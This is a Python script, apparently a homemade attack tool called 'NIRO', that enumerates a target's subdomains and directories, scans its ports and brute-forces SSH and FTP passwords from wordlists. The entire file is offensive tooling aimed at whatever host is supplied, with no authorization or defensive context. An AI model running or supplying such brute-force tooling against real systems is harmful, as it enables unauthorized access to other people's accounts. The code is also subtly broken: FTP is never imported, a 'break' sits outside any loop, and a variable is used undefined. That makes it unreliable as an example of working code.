import pyfiglet
import socket,requests
from datetime import datetime
import sys
import os.path
from os import path
import paramiko
from colorama import Fore


intro1 = pyfiglet.figlet_format("--->\\NIRO/<---")
print(Fore.RED + intro1)

intro2 = pyfiglet.figlet_format("Authored by EN-NIARI AMR \nFramed By EL MOSTAPHA CHAKIR" , font="digital")
print(Fore.CYAN + intro2)

now =datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

print(Fore.WHITE+"************************************************")
print("---------------------------------------------------------------------------------------")
print(Fore.YELLOW + "+ URL      :            http://"+sys.argv[1])
print(Fore.YELLOW + "+ Time     :            "+ dt_string)
print(Fore.YELLOW + "+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning, Passwords SPRYING  ")
print(Fore.WHITE + "---------------------------------------------------------------------------------------")
print("************************************************")
print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")
print(Fore.CYAN+"===========================================================")

s = pyfiglet.figlet_format("SUB-DOMAIN")
print(Fore.MAGENTA+s)

sub_file = str(input(Fore.BLUE+"[+] Enter subdomains file location : "+Fore.WHITE))
if(path.exists(sub_file) == True):
 sub_list = open(sub_file).read()
 subdoms = sub_list.splitlines()
 for sub in subdoms:
   sub_domains = f"http://{sub}.{sys.argv[1]}"
   try :
      requests.get(sub_domains)
   except requests.ConnectionError:
     pass
   else:
     print(Fore.GREEN +"[+] --> Valid domain : ",sub_domains)
 
 sub_list.close()  
else:
  print(Fore.RED+"[-] INVALID FILE")

print(Fore.RED+"---------------END OF SUBDOMAIN ENUMERATION-----------------")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE+"[*-*] Starting NIRO in DIRECTORY enumeration mode ...")
print(Fore.CYAN+"===========================================================")

d = pyfiglet.figlet_format("Search<->DIRECTORY")
print(Fore.MAGENTA+d)

dir_file = str(input(Fore.BLUE+"[+] Enter directory name file location : "+Fore.WHITE))
if (path.exists(dir_file)== True):
 directory = open(dir_file).read()
 directory_name = directory.splitlines()
 
 for dir in directory_name :
   dir_enum = f"http://{sys.argv[1]}/{dir}"
   r= requests.get(dir_enum)
   if r.status_code == 404:
     pass
   else:
    print(Fore.GREEN+"[+] ---> Valid Directory : ",dir_enum)
 
 directory.close()
else :
   print(Fore.RED+"[-] INVALID FILE")
   
print(Fore.RED+"---------------END OF DIRECTORY ENUMERATION-----------------")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in PORT SCANNING mode ...")
print(Fore.CYAN+"===========================================================")

p = pyfiglet.figlet_format("PORT-SCANNING")
print(Fore.MAGENTA+p)

open_ports=[]

ports=range(1,5000)
def probe_port(ip,port,result=1):
   try:
     sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
     sock.settimeout(5)
     r= sock.connect_ex((ip,port))
     if r == 0:
        result = r
     sock.close()
   except Exception as e:
     pass
   return result


for port in ports:
     sys.stdout.flush()
     response= probe_port(sys.argv[1],port)
     if response == 0:
         open_ports.append(port)

if open_ports:
    print(Fore.GREEN+"Open Ports are : ")
    print(sorted(open_ports))
else:
    print(Fore.RED+"[-] Looks like no ports are open") 

print(Fore.RED+"---------------END OF PORT SCANNING-----------------")

brute_force = pyfiglet.figlet_format("Password<->SPRYING")
print(Fore.MAGENTA+brute_force)



print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in SSH Brute force mode ...")
print(Fore.CYAN+"===========================================================")


username = str(input(Fore.BLUE+"[+] Enter Username : "+Fore.WHITE))
password_file = str(input(Fore.BLUE+"[+] Enter password file location : "+Fore.WHITE))


def ssh_connect(password, code=0):
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
       ssh.connect( sys.argv[1] ,port=22,username = username, password=password)
    except paramiko.AuthenticationException :
       code = 1
    ssh.close()
    return code

if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
        print(Fore.GREEN+" -----------------------")
        print("|   TCP PORT 22 OPEN    |")
        print(" -----------------------")
        if (path.exists(password_file) == True ):
         ssh_file = open(password_file).read()
         ssh_line = ssh_file.splitlines()   
         for password in ssh_line:
                try :
                    res = ssh_connect(password)
                    print(Fore.YELLOW+"[!] ACCOUNT CHECK : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password)
                    if (res==0) :
                        print(Fore.GREEN+"[+] ACCOUNT FOUND : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password+" [SUCCESS]")
                        break
                except Exception as e :
                        print(e)
                        pass
        else :
           print(Fore.RED+"[-] INVALID FILE .")
else:
        print(Fore.RED+"(-_-) PORT 22 CLOSED...")

print(Fore.RED+"---------------END OF SSH BruteForce-----------------")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE+"[*-*] Starting NIRO in FTP Brute force mode ...")
print(Fore.CYAN+"===========================================================")


def anonymous(ip):
    try :
        ftp= FTP(ip)
        ftp.login()
        print(Fore.GREEN+"-----------------------------")
        print("[+] ANONYMOUS LOGIN is OPEN")
        print("------------------------------")
        ftp.quit()
    except:
      pass    

def ftp_login(ip,username_ftp,passwd):
    try:
        ftp = FTP(ip)
        ftp.login(username_ftp, passwd)
        ftp.quit()
        print(Fore.GREEN+"[!] ACCOUNT FOUND : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word+"[SUCCESS]")
        break
    except:
        pass


def brute_force(ip, username_ftp, wordlists):
    try:
        ftp_list = open(wordlists).read()
        words = ftp_list.splitlines()
        for word in words:
            word = word.strip()
            print(Fore.YELLOW+"[!] ACCOUNT CHECK : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word)
            ftp_login(ip, username_ftp, word)

    except:
        print(Fore.RED+"[-] There is no such wordlist file.")
        exit(0)

#Main program
if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
   print(Fore.GREEN+"----------------------------")
   print(" [+] 21/TCP  FTP ---> OPEN ")
   print("----------------------------")
   username_ftp = str(input(Fore.BLUE+"Enter a spesific useranme : "+Fore.WHITE))
   wordlists = str(input(Fore.BLUE+"Enter FTP list File location : "+Fore.WHITE)) 
   brute_force(sys.argv[1],username_ftp,wordlists)
   veri = input(Fore.MAGENTA+"DO YOU WANT TO CHECK ANONYMOUS ACCOUNT [Y/n] : "+Fore.WHITE)
   if(veri == 'y' or veri == 'Y' ):
      anonymous(sys.argv[1])
   else:
      print(Fore.RED+"[-] INVALID CHOOSE")
else :
    print(Fore.RED+"----------------------------")
    print("[!] 21/TCP FTP ---> CLOSED")
    print("----------------------------")
print(Fore.RED+"---------------END OF FTP BruteForce-----------------")
